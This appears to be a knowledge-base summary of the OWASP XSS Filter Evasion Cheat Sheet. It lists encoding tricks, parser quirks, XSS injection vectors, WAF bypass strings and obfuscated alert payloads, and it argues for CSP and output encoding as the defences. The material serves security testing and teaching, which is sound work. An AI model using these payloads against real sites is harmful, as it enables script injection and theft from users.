---
title: "OWASP XSS Filter Evasion Cheat Sheet"
tags: [owasp, xss, filter-evasion, waf, injection, pentesting]
sources: [owasp-xss-filter-evasion.md]
updated: 2026-04-16
---

# OWASP XSS Filter Evasion Cheat Sheet

Source: `raw/owasp-xss-filter-evasion.md`

## Summary

Demonstrates why denylist/filter-based XSS defenses fail. Catalogs evasion techniques used in testing: encoding tricks, HTML parser quirks, event handler abuse, WAF bypass strings, and URL obfuscation. **Primary value: proves that context-aware output encoding + CSP are the only reliable defenses.** Used for application security testing and WAF validation.

## Key Evasion Categories

### Encoding Tricks

Browsers accept many equivalent representations of characters; naive regex filters miss them:

| Encoding                           | Example                     |
| ---------------------------------- | --------------------------- |
| Decimal HTML entity                | `&#106;` = `j`              |
| Hex HTML entity (no semicolon)     | `&#x6A`                     |
| Padded decimal (1–7 digits)        | `&#0000106`                 |
| URL encoding                       | `%6A`                       |
| DWORD / Octal / Hex IP             | `http://1113982867/`        |
| Base64 in data URI                 | `data:text/html;base64,...` |
| Mixed tab/newline in `javascript:` | `jav&#x09;ascript:`         |
| Null byte                          | `java\0script:`             |
| Unicode escape                     | `\u006A`                    |

### HTML Parser Quirks

- Missing closing tags auto-closed by browser
- Non-alpha-non-digit after tag name treated as whitespace (`<SCRIPT/XSS SRC=...>`)
- Extraneous `<` before tag name
- Event handlers accept any char 1–32 before `=`
- IE conditional comments: `<!--[if gte IE 4]><script>...</script><![endif]-->`

### Injection Vectors (partial list)

```
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">
<STYLE>@import'javascript:alert(1)';</STYLE>
<base href="javascript:alert(1);//">
```

### WAF Bypass Techniques

- Use event handlers instead of `<script src>`
- Inject via `data:` URI base64 encoding
- Split keywords: `top["al"+"ert"](1)`
- Abuse HTTP Parameter Pollution to inject into JS context from a different parameter
- Stored XSS bypasses WAFs entirely (WAF only sees the write, not the read)

### Alert Obfuscation (payload evasion)

```
(alert)(1)
al\u0065rt(1)
top[8680439..toString(30)](1)
alert?.()
[1].find(alert)
```

## Key Takeaway for Defenders

This cheat sheet shows **input filtering is incomplete defense**:

- Filters can't enumerate all encoding permutations
- Parser behavior differs across browsers
- WAFs can't protect stored XSS at read time

**Correct defenses:** [Content Security Policy](../concepts/content-security-policy.md) + context-aware output encoding per [DOM-based XSS](../concepts/dom-xss.md) guidelines.

## Related Concepts

- [DOM-based XSS](../concepts/dom-xss.md)
- [Content Security Policy](../concepts/content-security-policy.md)
- [Input Validation](../concepts/input-validation.md)
- [Encoding and Escaping](../concepts/encoding-and-escaping.md)
- [Web Application Firewall](../concepts/web-application-firewall.md)
